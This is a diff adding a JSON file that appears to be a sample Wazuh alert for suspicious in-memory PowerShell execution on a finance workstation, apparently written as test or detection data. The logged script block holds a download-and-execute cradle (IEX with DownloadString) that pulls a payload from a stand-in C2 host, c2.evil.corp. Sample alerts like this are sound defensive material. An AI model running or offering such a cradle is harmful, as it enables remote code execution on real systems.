@@ -1,0 +1,40 @@
+{
+  "timestamp": "2026-10-21T09:15:30.123+0000",
+  "rule": {
+    "level": 12,
+    "description": "Suspicious PowerShell In-Memory Script Block Execution",
+    "id": "100109",
+    "mitre": {
+      "id": ["T1059.001"],
+      "tactic": ["Execution"]
+    }
+  },
+  "agent": {
+    "id": "002",
+    "name": "WKS-FIN-014",
+    "ip": "192.168.56.20"
+  },
+  "manager": {
+    "name": "wazuh-manager"
+  },
+  "data": {
+    "win": {
+      "system": {
+        "providerName": "Microsoft-Windows-PowerShell",
+        "providerGuid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
+        "eventID": "4104",
+        "version": "1",
+        "channel": "Microsoft-Windows-PowerShell/Operational",
+        "computer": "WKS-FIN-014.corp.local",
+        "severityValue": "VERBOSE",
+        "message": "Creating Scriptblock text (1 of 1):\nIEX (New-Object Net.WebClient).DownloadString('http://c2.evil.corp/payload.ps1')"
+      },
+      "eventdata": {
+        "scriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.corp/payload.ps1')",
+        "scriptBlockId": "12345678-abcd-ef01-2345-6789abcdef01",
+        "messageNumber": "1",
+        "messageTotal": "1"
+      }
+    }
+  }
+}
